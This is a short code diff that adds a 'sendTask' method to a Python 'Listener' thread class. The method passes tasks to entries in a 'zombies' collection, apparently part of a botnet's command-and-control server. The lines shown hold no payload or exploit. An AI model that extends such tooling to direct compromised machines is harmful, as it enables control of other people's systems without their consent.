@@ -71,6 +71,10 @@ class Listener(threading.Thread):
 
 		return result
 
+
+	def sendTask(self, id, task):
+		return self.zombies[id].sendTask(task)
+
 	#kill the thread
 	def stop(self):
 
